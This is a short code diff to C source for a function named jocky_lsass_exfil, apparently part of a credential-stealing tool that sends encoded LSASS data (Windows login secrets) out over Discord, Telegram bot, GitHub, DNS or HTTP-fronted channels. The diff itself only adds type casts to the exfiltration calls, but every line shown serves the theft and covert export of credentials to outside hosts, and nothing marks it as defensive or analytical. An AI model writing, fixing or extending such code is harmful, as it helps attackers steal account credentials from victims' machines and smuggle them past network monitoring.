@@ -243,7 +243,7 @@ bool jocky_lsass_exfil(const char *exfil_url, const char *exfil_type)
     bool ok = false;
 
     if (strcmp(exfil_type, "discord") == 0) {
-        ok = jocky_exfil_discord(exfil_url, enc, enc_sz);
+        ok = jocky_exfil_discord(exfil_url, (int8_t*)enc, (int32_t)enc_sz);
 
     } else if (strcmp(exfil_type, "telegram") == 0) {
         /* Convention: exfil_url = "<bot_token>:<chat_id>" */
@@ -253,7 +253,7 @@ bool jocky_lsass_exfil(const char *exfil_url, const char *exfil_type)
             size_t tlen = (size_t)(sep - exfil_url);
             if (tlen < sizeof(token)) {
                 memcpy(token, exfil_url, tlen);
-                ok = jocky_exfil_telegram(token, sep + 1, enc, enc_sz);
+                ok = jocky_exfil_telegram(token, sep + 1, (int8_t*)enc, (int32_t)enc_sz);
             }
         }
 
@@ -265,12 +265,12 @@ bool jocky_lsass_exfil(const char *exfil_url, const char *exfil_type)
             size_t tlen = (size_t)(sep - exfil_url);
             if (tlen < sizeof(token)) {
                 memcpy(token, exfil_url, tlen);
-                ok = jocky_exfil_github(token, sep + 1, enc, enc_sz);
+                ok = jocky_exfil_github(token, sep + 1, (int8_t*)enc, (int32_t)enc_sz);
             }
         }
 
     } else if (strcmp(exfil_type, "dns") == 0) {
-        ok = jocky_exfil_dns(exfil_url, enc, enc_sz);
+        ok = jocky_exfil_dns(exfil_url, (int8_t*)enc, (int32_t)enc_sz);
 
     } else if (strcmp(exfil_type, "http") == 0) {
         ok = jocky_exfil_front(exfil_url, exfil_url, "/", enc, enc_sz);
